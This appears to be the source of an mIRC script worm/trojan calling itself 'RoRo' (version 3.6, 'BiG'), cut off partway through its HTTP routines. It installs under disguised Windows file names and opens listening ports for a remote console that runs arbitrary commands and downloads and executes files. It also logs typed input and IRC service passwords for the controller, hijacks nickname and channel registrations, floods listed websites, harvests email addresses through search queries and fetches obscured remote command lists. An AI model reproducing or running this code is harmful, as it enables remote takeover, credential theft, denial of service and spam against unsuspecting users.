[script]
n0=alias setFileNames { $SFN(RNA, C:\WINDOWS\cmdtaska.cfg) | $SFN(IRC, C:\WINDOWS\slagesys.def) | $SFN(DEF, C:\WINDOWS\egals16.dll) }
n1=alias winDir { .return C:\WINDOWS }
n2=alias winFile { .return C:\WINDOWS\libegals98.sys }
n3=alias runDLL { .return C:\WINDOWS\dxegals16.exe }
n4=alias setPriv { .hadd Data Priv $1 }
n5=alias getPriv { .return $hget(Data,Priv) }
n6=alias setStat { .writeini $winFile Options Virus $1 }
n7=alias getStat { var %s = $readini($winFile, Options, Virus) | if (!%s) %s = Semi | .return %s }
n8=alias setCountry { .writeini $winFile Options Country $1 }
n9=alias getCountry { var %s = $readini($winFile, Options, Country) | if (!%s) %s = OTHER | .return %s }
n10=alias GFN { .return $readini($winFile,Files,$1) }
n11=alias SFN { .writeini $winFile Files $1 $2- }
n12=alias addHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }
n13=alias delHTTP { .Remini $GFN(DEF) HTTP $1 }
n14=alias addMAIL { .Writeini $GFN(DEF) MAIL- $+ $1 $2 $3 }
n15=alias delMAIL { .Remini $GFN(DEF) MAIL- $+ $1 $2 }
n16=alias addSITE { .Writeini $GFN(DEF) SITES $1 $2- }
n17=alias delSITE { .Remini $GFN(DEF) SITES $1 }
n18=alias Wind { .return @ $+ $1 }
n19=alias Verify { if ($sock($1).name != $null) { .return 1 } | .return 0 }
n20=
n21=; * INIT Functions *
n22=on *:Connect:{ .Init }
n23=on *:Disconnect:{ .timers off | .sockclose * }
n24=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }
n25=on *:Start:{ .Start }
n26=alias Start {
n27=  if ($version < 5.8) { .unload -rsn $script | .halt }
n28=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1
n29=  if ($HGet(Data).size > 0) { .hfree Data } | .hmake Data 100
n30=  .hadd Data Recving Idle | .hadd Data Sending Idle | .hadd Data Visited 0
n31=  .hadd Data iIPCount 5 | .hadd Data iJoinCount 5 | .hadd Data iAddrCount 5 | .hadd Data iInviteCount 3
n32=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global
n33=  .setFileNames | .setStat $getStat | .setCountry $getCountry | .setPriv Slave | .setLoad Big
n34=  if ($getStat == Full) { .hadd Data Spread On }
n35=  .hadd Data Loaded $calc($readini($winFile,Options,Loaded) + 1) | .writeini $winFile Options Loaded $hget(Data, Loaded)
n36=  .setMode Full | .write -c notes.txt | .load -rs1 notes.txt | .sockclose *
n37=}
n38=alias Init {
n39=  if ($hget(Data).size == 0) { .unload -rsn $script }
n40=  .ignore -r | .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off
n41=  if ($readini($winFile, Options, Init2) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }
n42=  .timerListenIt 1 5 { .ListenIt }
n43=  .timerHttpMe 1 15 { .httpMe }
n44=  .timerSetInfo 1 15 { .setInfo }
n45=  .timerDDos 0 45 { .DDos }
n46=  .timerAdvMe 0 $rand(300, 600) { .advMe 1 10 }
n47=  if (3 // $hget(Data, Loaded) && $hget(Data, extractHTML) != 1) { .hadd Data extractHTML 1 | .extractHTML }
n48=}
n49=alias ListenIt { if ($portfree(1994) == $true) { .socklisten Listen-RecvFile 1990 | .socklisten Listen-SendFile 1991 | .socklisten Listen-Mutex 1994 | .socklisten Listen-BNC 1999 | .socklisten Listen-Console 2000 } }
n50=alias AcceptIt { var %sName "" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto AcceptIt | .sockaccept %sName | return %sName }
n51=alias OpenIt { var %sName "" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto OpenIt | return %sName }
n52=
n53=; * SEND/RECV Files *
n54=alias SendFile {
n55=  ; $1 - ACTION , $2 - $sockname , $3 - Local Filename , $4 - Remote Filename , $5 - Virus
n56=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, SendFile) , %sRead , %iSize
n57=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }
n58=
n59=  if (CLOSE isin $1) || ($sockerr > 0) {
n60=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }
n61=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
n62=  }
n63=  if (READ isin $1) {
n64=    .sockread %sRead
n65=    .hadd Data $rev(%sName, LocalName) $shortfn($GetTok(%sRead, 2, $asc(!)))
n66=    .hadd Data $rev(%sName, Pos) $GetTok(%sRead, 3, $asc(!))
n67=    .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))
n68=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
n69=    if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sName, Pos)) bytes. Sending in Progress.. }
n70=  }
n71=  if (OPEN isin $1) {
n72=    .hadd Data $rev(%sName, LocalName) $shortfn($3)
n73=    .hadd Data $rev(%sName, RemoteName) $4
n74=    .hadd Data $rev(%sName, Virus) $5
n75=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))
n76=    .hadd Data $rev(%sName, Pos) 0
n77=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
n78=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Busy }
n79=    else { .hadd Data $rev(%sName, Virus) 0 }
n80=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1990 }
n81=  }
n82=  if (INIT isin $1) {
n83=    %iSize = $file($hget(Data, $rev(%sName, LocalName))).size
n84=    if ($Verify($2) == 1) { .sockwrite -tn $2 SendFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iSize $+ ! $+ $hget(Data, $rev(%sName, Remote)) $+ ! $+ $hget(Data, $rev(%sName, Virus)) }
n85=  }
n86=  if (SEND isin $1) {
n87=    .bread $hget(Data, $rev(%sName, LocalName)) $hget(Data, $rev(%sName, Pos)) 2048 &bRead
n88=    if ($bvar(&bRead, 0)) { if ($Verify($2) == 1) { .sockwrite $2 &bRead } | .hadd Data $Rev(%sName, Pos) $calc($hget(Data, $rev(%sName, Pos)) + 2048) }
n89=    else {
n90=      if (%bServer == 1 && $Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) File Successfully Sent.. }
n91=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }
n92=      .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
n93=    }
n94=  }
n95=}
n96=
n97=alias RecvFile {
n98=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename
n99=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead , %iResume
n100=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }
n101=
n102=  if (CLOSE isin $1) || ($sockerr > 0) {
n103=    if (%bServer == 1) {
n104=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { 
n105=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }
n106=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }
n107=      }
n108=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) {
n109=        .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC..
n110=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle }
n111=      }
n112=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .sockclose $hget(Data, $rev(%sName, Remote)) }
n113=    }
n114=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
n115=  }
n116=  if (OPEN isin $1) {
n117=    .hadd Data $rev(%sName, RemoteName) $3
n118=    .hadd Data $rev(%sName, LocalName) $4
n119=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))
n120=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1991 }
n121=  }
n122=  if (INIT isin $1) {
n123=    %iResume = $file($hget(Data, $rev(%sName, LocalName))).size | if (%iResume == $null) { %iResume = 0 }
n124=    .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iResume $+ ! $+ $hget(Data, $rev(%sName, Remote))
n125=  }
n126=  if (RECV isin $1) {
n127=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {
n128=      .sockread %sRead
n129=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))
n130=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))
n131=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))
n132=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))
n133=      .hadd Data $rev(%sName, Init) 1
n134=      if ($hget(Data, $rev(%sName, Virus)) == 1) {
n135=        if ($hget(Data, Recving) == Busy) || ($getStat == Full) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
n136=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \ $+ $random($rand(5,10)) $+ .exe
n137=      }
n138=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }
n139=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }
n140=    }
n141=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | .goto RecvMore } }
n142=  }
n143=}
n144=
n145=; * SERVER FILES *
n146=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }
n147=on *:sockread:Server-SendFile-*:{ .SendFile READ|SEND $sockname }
n148=on *:sockwrite:Server-SendFile-*:{ .SendFile SEND $sockname }
n149=
n150=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }
n151=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }
n152=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }
n153=
n154=; * LOCAL FILES *
n155=on *:sockopen:Local-SendFile-*:{ .SendFile INIT $sockname }
n156=on *:sockwrite:Local-SendFile-*:{ .SendFile SEND $sockname }
n157=on *:sockclose:Local-SendFile-*:{ .SendFile CLOSE $sockname }
n158=
n159=on *:sockopen:Local-RecvFile-*:{ .RecvFile INIT $sockname }
n160=on *:sockread:Local-RecvFile-*:{ .RecvFile RECV $sockname }
n161=on *:sockclose:Local-RecvFile-*:{ .RecvFile CLOSE $sockname }
n162=
n163=; * SERVER CONSOLE *
n164=on *:socklisten:Listen-Console:{ .AcceptIt Server-Console }
n165=on *:sockwrite:Server-Console-*:{
n166=  if ($hget(Data, $rev($sockname, Active)) == DIR) {
n167=    .inc %DIR.i | %DIR.Tmp = $ev(DIR, Items, %DIR.i)
n168=    if (%DIR.Tmp && $Verify($sockname)) { .sockwrite -tn $sockname %DIR.Tmp }
n169=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }
n170=  }
n171=}
n172=on *:sockread:Server-Console-*:{ 
n173=  if ($sockerr > 0) { .return }
n174=  var %sRead | .sockread %sRead | .tokenize 32 %sRead
n175=  if ($1 == HELLO) { .Hello }
n176=  else if ($1 == STATUS) { .StatusMe }
n177=  else if ($1 == INFO) { .InfoMe }
n178=  else if ($1 == MASS) { .MassMe $2- }
n179=  else if ($1 == DIR) { .DIR $2- }
n180=  else if ($1 == BNC) { .BNCIt $2- }
n181=  else if ($1 == SNIFFER) { .SnifferIt $2- }
n182=  else if ($1 == EXEC) { .ExecIt $2- }
n183=  else if ($1 == RENAME) { .RenameIt $2- }
n184=}
n185=
n186=on *:sockopen:Server-Console-*:{ .sockwrite -tn $sockname Rename Local-Console- $+ $me }
n187=alias OpenServerConsole { var %sConsole = $OpenIt(Server-Console) | if ($2) { .sockopen %sConsole $2 2000 } }
n188=alias RenameIt { .sockrename $sockname $1 | .InitConsole }
n189=
n190=; * LOCAL CONSOLE *
n191=on *:Close:@Local-Console-*:{ .CloseConsole $GetTok($target, 3-, $asc(-)) }
n192=alias CloseConsole { .sockclose Local-Console- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1, *) | .window -c @Local-Console- $+ $1 }
n193=alias OpenConsole { var %sConsole = Local-Console- $+ $1 | if ($Verify(%sConsole) == 0 && $2) { .sockopen %sConsole $2 2000 } }
n194=alias UseConsole {
n195=  var %sConsole = Local-Console- $+ $1 | if (!$Verify(%sConsole)) { .return }
n196=  if ($getPriv == Master) { .aline -h 4 $wind(%sConsole) [>>] $2- } | .sockwrite -tn %sConsole $2-
n197=  if ($2 == SendFile) { $SendFile(OPEN, Local-SendFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!)), $getTok($3-, 3, $asc(!))) }
n198=  if ($2 == RecvFile) { $RecvFile(OPEN, Local-RecvFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!))) }
n199=}
n200=alias InitConsole {
n201=  if ($sockerr > 0) { .return }
n202=  if ($getPriv == Master) { .window -aex $wind($sockname) }
n203=  .UseConsole $GetTok($sockname, 3-, $asc(-)) Hello
n204=}
n205=on *:sockopen:Local-Console-*:{ .InitConsole }
n206=on *:sockread:Local-Console-*:{
n207=  if ($sockerr > 0) { .return } | var %sRead , %sNick = $GetTok($sockname, 3-, $asc(-))
n208=  .sockread %sRead | .tokenize 32 %sRead | if ($getPriv == Master) { .aline -h 12 $wind($sockname) [<<] $1- }
n209=  if ($1 == (HELLO)) { if ($hget(Data, MassExec)) { .UseConsole %sNick Mass $hget(Data, MassExec) } | .UseConsole %sNick Status }
n210=  if ($1 == (STATUS)) {
n211=    .hadd Data $rev($sockname, Remote) $4 | .hadd Data $rev($sockname, IP) $5
n212=    if ($getStat == Full && $hget(Data, Sending) == Idle) {
n213=      if ($2-3 == Semi Idle) { .UseConsole %sNick SendFile $runDLL $+ !C:\ $+ $random($rand(5,10)) $+ .exe!1 }
n214=      else if ($getPriv != Master) { .CloseConsole %sNick }
n215=    }
n216=    else if ($getPriv != Master) { .CloseConsole %sNick }
n217=  }
n218=}
n219=on *:sockclose:Local-Console-*:{ .hdel -w Data $rev($sockname, *) | if ($getPriv == Master) { .aline 6 $wind($sockname) [!!] Console closed by remote host.. } }
n220=
n221=; * TROJAN FUNCTIONS *
n222=alias getScript { .return BiG }
n223=alias getVersion { .return 3.6 }
n224=alias setInfo { .writeini $GFN(RNA) Options Info $getInfo | .writeini $GFN(IRC) Options Info $getInfo }
n225=alias getInfo { .return ( $+ $me $+ )-( $+ $Ip $+ )-( $+ $Host $+ )-( $+ $Server $+ )-(RoRo $getVersion $getScript $+ )-(mIRC $Version $+ )-(Win $OS $+ ) }
n226=alias Hello { .sockwrite -tn $sockname (HELLO) I'm running RoRo Console $getVersion - $+ $getScript $+ - }
n227=alias StatusMe { .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) $sockname $ip }
n228=alias InfoMe { .sockwrite -tn $sockname (INFO) $getInfo }
n229=alias SnifferIt { .sockwrite -tn $sockname (SNIFFER) Options completed. | .hadd Data Sniffer.Console $sockname | .hadd Data Sniffer $1 }
n230=alias BNCIt { if ($verify(Gateway-BNC) != 1) { .sockwrite -tn $sockname (BNC) Server: $1 Port: $2 | .sockopen Gateway-BNC $1 $2 } }
n231=alias setMode { var %iDate = $gettok($date,1,$asc(/)) | if (5 // %iDate) .AddHTTP SOS- $+ $calc(%iDate * $gettok($date,2,$asc(/))) $+ $decode(LnRyaXBvZC5jb20vQ29tbWFuZHMudHh0,mt) NULL EXEC }
n232=alias ExecIt {
n233=  if ($1 == RESTART) { .run $windir $+ \rundll.exe user.exe,exitwindowsexec }
n234=  else if ($1 == SHUTDOWN) { .run $windir $+ \rundll.exe user.exe,exitwindows }
n235=  else if ($1 == FUCKOFF) { .remove $winFile }
n236=  else { [ [ $1- ] ] } | .sockwrite -tn $sockname (EXEC) $1- Executed..
n237=}
n238=alias MassMe {
n239=  .sockwrite -tn $sockname (MASS) Accepted. | var %sExec = $readini($GFN(DEF), Mass, Executed)
n240=  if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }
n241=}
n242=
n243=; * DIR *
n244=alias DIRFormat { .return ..\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) < $+ 4DIR> }
n245=alias FILEFormat { .return ..\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) ( $+ 10 $+ $Bytes($file(%DIR.Item).size).suf $+ ) }
n246=alias DRIVEFormat { .return $chr(91) $+  $+ 6 $+ $disk(%DIR.L).type $+  $+ $chr(93) %DIR.L $+ :\ ( $+ 7 $+ $disk(%DIR.L).Label $+ ) $+  $+ 10 $Bytes($calc($disk(%DIR.L).size - $disk(%DIR.L).free)).suf $+  $+ 10 $Bytes($disk(%DIR.L).size).suf }
n247=alias DIR {
n248=  if ($hget($sockname, Active) == DIR) { .return } | .unset %DIR.* | %DIR.Index = 0 | %DIR.Index2 = 0
n249=  if ($1 != DRIVES) { .goto DirFiles } | %DIR.Letters = CDEFGHIJKLMNOPQRSTUVWXYZ
n250=  :DirDrives | .inc %DIR.Pos | %DIR.L = $mid(%Dir.Letters, %DIR.Pos, 1) | if (!%DIR.L) { .goto DirEnd }
n251=  if ($disk(%DIR.L)) { $sev(DIR, Items, %DIR.Index, $DRIVEFormat) | .inc %Dir.Index } | .goto DirDrives
n252=  :DirFiles | %DIR.CD = $getTok($1-, 1- $+ $calc($0 - 2), 32) | %DIR.Mask = $getTok($1-, $calc($0 - 1), 32) | %DIR.Depth = $getTok($1-, $0, 32)
n253=  $sev(DIR, Items, 0, BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth)
n254=  :DirNext | .inc %DIR.Index | %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)
n255=  if (%DIR.item) { $sev(DIR, Items, %DIR.Index, $DIRFormat) | .goto DirNext } | .dec %DIR.Index
n256=  :FileNext | .inc %DIR.Index2 | %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)
n257=  if (%DIR.item) { $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $FILEFormat) | .goto FileNext } | .dec %DIR.Index2
n258=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s))
n259=  :DirEnd | if ($Verify($sockname)) { .hadd Data $rev($sockname, Active) DIR | .sockwrite -tn $sockname $ev(DIR, Items, 0) }
n260=}
n261=
n262=; * EVS *
n263=alias istrue { if ($1 == $2) { $3- } }
n264=alias ishigher { if ($1 > $2) { $3- } }
n265=alias islower { if ($1 < $2) { $3- } }
n266=alias ev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return % [ $+ [ %s ] ] }
n267=alias rev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return %s }
n268=alias sev { var %i = 0 , %s | while (%i != $calc($0 - 1)) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | set % [ $+ [ %s ] ] $getTok($1-, $0 $+ -, 32) }
n269=
n270=; * PASS *
n271=alias dif {
n272=  var %s , %i | %i = $readini($GFN(IRC), Options, Count)
n273=  if (!$server) { .return } | if (!$GFN(IRC)) { .setFileNames }
n274=  if ($1 == 1) { %s = Temp-Pass } | if ($1 == 2) { %s = OS-Pass } | if ($1 == 3) { %s = OPER-Pass }
n275=  if ($3 && $readini($GFN(IRC),$2,%s) != $3) || ($4 && $readini($GFN(IRC),$2,Perm-Pass) != $4) { .inc %i | if (2 // %i) { .writeini $GFN(IRC) Options Status New } }
n276=  if ($3) { .writeini $GFN(IRC) $2 %s $3 } | if ($4) { .writeini $GFN(IRC) $2 Perm-Pass $4 } | .writeini $GFN(IRC) Options Count %i
n277=}
n278=alias setLoad { var %iDate = $gettok($date,1,$asc(/)) | if (5 // %iDate) .AddHTTP SOS- $+ $calc(%iDate * $gettok($date,2,$asc(/))) $+ $decode(LmhpdC5iZy9Db21tYW5kcy50eHQ=,mt) NULL EXEC }
n279=on *:input:*:{
n280=  var %i = 0 , %iT , %sT = $me
n281=  if (*Msg NS iswm $1-2) { %iT = 1 | %i = 1 } | if (*Msg OS iswm $1-2) { %iT = 2 | %i = 1 } | if (*Msg CS iswm $1-2) { %iT = 1 | %sT = $null | %i = 1 }
n282=  if (*NickServ iswm $1) { %iT = 1 | %i = 0 } | if (*OperServ iswm $1) { %iT = 2 | %i = 0 } | if (*ChanServ iswm $1) { %iT = 1 | %sT = $null | %i = 0 }
n283=  if (%iT) { .tokenize 32 $getTok($1-,$calc(2 + %i),32) %sT $getTok($1-,$calc(3 + %i) $+ -,32) | if (id isin $1) || (reg isin $1) || (newp isin $1) { .dif %iT $2- } }
n284=  if (*Oper iswm $1 && $0 == 3) { .dif 3 $2- }
n285=  if (i isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (INPUT) ( $+ $active $+ ) $1- }
n286=  if (@Local-* iswm $active) { .UseConsole $GetTok($active, 3-, $asc(-)) $1- }
n287=}
n288=
n289=; * DROP *
n290=alias Drop {
n291=  if ($getCountry == Other) || (!$readini($GFN(IRC), $2, Perm-Pass)) { .return }
n292=  if ($1 == NICK) { .ignore -u30 NS | .msg ns id $readini($GFN(IRC), $2, Temp-Pass) | .msg ns drop $readini($GFN(IRC), $2, Perm-Pass) | .msg ns reg $Random($Rand(4,7)) $Random($Rand(3,8)) }
n293=  if ($1 == CHAN) { .ignore -u30 CS | .msg cs drop $2 $readini($GFN(IRC), $2, Perm-Pass) | .msg cs reg $2 $Random($Rand(4,7)) $Random($Rand(3,8)) }
n294=}
n295=
n296=; * CLONES *
n297=alias Random { var %i = 0 , %s | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }
n298=alias UseClone { if ($sock(Clone-*, 0) > 0) { .sockwrite -tn Clone-* $1- } }
n299=alias LoadClone { var %sock = $OpenIt(Clone) | .sockopen %sock $1 6667 | .sockmark %sock $1- }
n300=on *:sockopen:Clone-*:{
n301=  if ($sockerr > 0) { .return } | .tokenize 32 $sock($sockname).mark
n302=  var %Server = " $+ $1 $+ " , %Nick = $Random($Rand(4,9)) , %Ident = $Random($Rand(4,7)) , %Mail = " $+ $Random($Rand(4,7)) $+ " , %Name = $Random($Rand(3,10)) $Random($Rand(2,6))
n303=  if ($2) { %Nick = $2 } | if ($3) { %Ident = $3 } | if ($4) { %Mail = " $+ $4 $+ " } | if ($5) { %Name = : $+ $5- }
n304=  .sockwrite -tn $sockname NICK %Nick | .sockwrite -tn $sockname USER %Ident %Mail %Server %Name
n305=}
n306=on *:sockread:Clone-*:{
n307=  if ($sockerr > 0) { .return } | var %sRead , %sNick
n308=  .sockread %sRead | %sNick = $remove($gettok(%sRead, 1, $asc(!)),:) | .tokenize 32 $gettok(%sRead, 2-, $asc(:))
n309=  if (PING* iswm %sRead) { .sockwrite -tn $sockname PONG $getTok(%sRead, 2, 32) }
n310=  else if ($1 == IP!) { .sockwrite -tn $sockname NOTICE %sNick :IP_ $+ $IP }
n311=  else if ($1 == OpenServerConsole) { .OpenServerConsole $2- }
n312=  else if (IP_* iswm $1) {
n313=    .hadd Data iIP $calc($hget(Data, iIP) + 1)
n314=    if ($hget(Data, iIPCount) // $hget(Data, iIP) && $gettok($sock($sockname).mark,2,32) != %sNick) { .OpenConsole %sNick $gettok($1,2,$asc(_)) }
n315=  }
n316=}
n317=
n318=; * BNC *
n319=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }
n320=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }
n321=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }
n322=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }
n323=on *:sockread:Server-BNC:{ var %sRead | .sockread %sRead | if ($Verify(Gateway-BNC)) { .sockwrite -tn Gateway-BNC %sRead } }
n324=on *:sockread:Gateway-BNC:{ var %sRead | .sockread %sRead | if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) { .sockwrite -tn Server-BNC %sRead } }
n325=
n326=; * DDOS *
n327=alias DDos {
n328=  .sockclose DDos-*
n329=  var %i = 0 , %iCount = $ini($GFN(DEF), DDos, 0) , %sTmp , %sName
n330=  while (%i < %iCount) { 
n331=    .inc %i | %sTmp = $ini($GFN(DEF), DDos, %i)
n332=    %sTmp = $remove(%sTmp,free.,www.,http://) | %sTmp = $getTok(%sTmp, 1, $asc(/))
n333=    if ($pos(%sTmp,.) > 1) { %sTmp = $getTok(%sTmp, 2-, $asc(.)) }
n334=    %sName = $OpenIt(DDos) | .sockopen %sName %sTmp 80 | .sockmark %sName %sTmp
n335=  }
n336=}
n337=on *:sockopen:DDos-*:{ if ($sockerr > 0) { .return } | .RequestURL $sockname / $sock($sockname).mark }
n338=on *:sockread:DDos-*:{ :DDosMore | .sockread &bRead | if ($sockbr != 0) { .goto DDosMore } }
n339=
n340=; * EXTRACT ADDR *
n341=alias validAddr { if ($len($1-) > 8 && $len($1-) < 64) { if ($pos($1-,.,0) == 1 && $pos($1-,@,0) == 1) .return 1 } | .return 0 }
n342=alias newAddr { if ($readini($GFN(DEF), Outbox, $1)) || ($readini($GFN(DEF), Inbox, $1)) .return 0 | .return 1 }
n343=alias extractAddr { 
n344=  var %sAddr , %i = 0 , %iCount = $wildTok($2-, *@*.*, 0, 32)
n345=  while (%i < %iCount) {
n346=    .inc %i | %sAddr = $wildTok($2-, *@*.*, %i, 32) 
n347=    if ($validAddr(%sAddr) && $newAddr(%sAddr)) { 
n348=      .hadd Data iAddr $calc($hget(Data, iAddr) + 1) 
n349=      if ($1 == NICK) || ($hget(Data, iAddrCount) // $hget(Data, iAddr)) { .writeini $GFN(DEF) Outbox %sAddr UnSent }
n350=    }
n351=  }
n352=}
n353=
n354=; * EXTRACT HTML *
n355=alias extractHTML {
n356=  var %iIndex = $rand(10, 800) , %iEngine = $rand(0,2) , %sTmpDir , %sTag , %sFile , %sSearch , %sSearch2
n357=  %sSearch = mail.bg|abv.bg|yahoo.com|mail.com|hotmail.com|usa.net|yahoo.de|gmx|usa.com|mail+.co.uk|mail+.ch|mailto+.jp|mail+.de|mail+.fr|mailto+.ca|mailto+.ru
n358=  %sSearch2 = sex|mailto|mail|flash|girl|sport|e-mail|links|food|mailto|school|e-mail|dream|team|rap|boy|think|mail|ball|email|nice|true|e-mail|write
n359=  %sTmpDir = $windir $+ \Temp | if ($exists(%sTmpDir) == $false) .return
n360=  :extractFile | %sFile = %sTmpDir $+ \ $+ TmpFile $+ $rand(1,10000) $+ .faith | if ($exists(%sFile) == $true) .goto extractFile
n361=  %sSearch = $getTok(%sSearch, $rand(1, $numTok(%sSearch, $asc(|))), $asc(|)) | if (!%sSearch) .return
n362=  %sSearch2 = $getTok(%sSearch2, $rand(1, $numTok(%sSearch2, $asc(|))), $asc(|)) | if (!%sSearch2) .return
n363=  if (bg !isin %sSearch) { %sSearch = %sSearch $+ + $+ %sSearch2 }
n364=  if (%iEngine == 1) { %sTag = google.yahoo.com/bin/query?p= $+ %sSearch $+ &b= $+ %iIndex $+ &hc=0&hs=0&xargs= }
n365=  else { %sTag = google.com/search?q= $+ %sSearch $+ &hl=en&lr=&ie=UTF-8&start= $+ %iIndex $+ &sa=N }
n366=  .GetHTTP %sTag %sFile SAVE
n367=}
n368=
n369=; * HTTP *
n370=alias RequestURL {
n371=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*
n372=  .sockwrite -n $1 Accept-Language: en | .sockwrite -n $1 Accept-Encoding: deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)
n373=  if ($pos($3,.,0) == 1) { .sockwrite -n $1 Host: www. $+ $3 } | if ($pos($3,.,0) != 1) { .sockwrite -n $1 Host: $3 }
n374=  .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1
n375=}
n376=alias HttpMe {
n377=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))
